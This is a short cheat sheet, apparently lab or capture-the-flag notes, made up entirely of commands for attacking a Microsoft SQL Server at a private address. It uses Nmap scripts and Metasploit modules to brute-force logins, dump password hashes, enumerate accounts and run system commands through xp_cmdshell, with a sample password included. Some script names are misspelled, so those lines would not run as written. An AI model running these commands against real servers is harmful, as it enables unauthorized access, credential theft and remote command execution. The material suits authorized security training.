# MSSQL NSE Scripts

```bash
nmap 192.168.2.3

nmap 192.168.2.3 -p1433 -sV

(info)
nmap 192.168.2.3 -p1433 -sV --script ms-sql-info

nmap 192.168.2.3 -p1433 -sV --script ms-sql-ntlm-info --script-args mssql.instance-port=1433

(brute)
nmap 192.168.2.3 -p1433 -sV --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passowrds.txt

(empty password)
nmap 192.168.2.3 -p1433 -sV --script ms-sql-empty-passowrd

(query - syslogins)
nmap 192.168.2.3 -p1433 -sV --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * From master..syslogins" -oN output.txt

(hash_dump)
nmap 192.168.2.3 -p1433 -sV --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria

(Run cmd command with nmap  -- "Command Execution")
nmap 192.168.2.3 -p1433 -sV --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"

nmap 192.168.2.3 -p1433 -sV --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```




# MSSQL Metasploit

#### Nmap
```bash
nmap 192.168.2.3
nmap 192.168.2.3 -p1433 -sV --script ms-sql-info
```

#### Metasploit
```bash
(login credentials)
msf6> use auxiliary/scanner/mssql/mssql_login
msf6> set rhosts 192.168.2.3
msf6> set user_file /root/Desktop/wordlist/common_users.txt
msf6> set pass_file /root/Desktop/wordlist/100-common-password.txt
msf6> set verbose false
msf6> run

(enum)
msf6> use auxiliary/admin/mssql/mssql_enum
msf6> set rhosts 192.168.2.3
msf6> run

(enum sql logins)
msf6> use auxiliary/admin/mssql/mssql_enum_sql_logins
msf6> set rhosts 192.168.2.3
msf6> run

(command exec)
msf6> use auxiliary/admin/mssql/mssql_exec
msf6> set rhosts 192.168.2.3
msf6> set cmd whoami
msf6> run

(domain accounts)
msf6> use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6> set rhosts 192.168.2.3
msf6> run
```
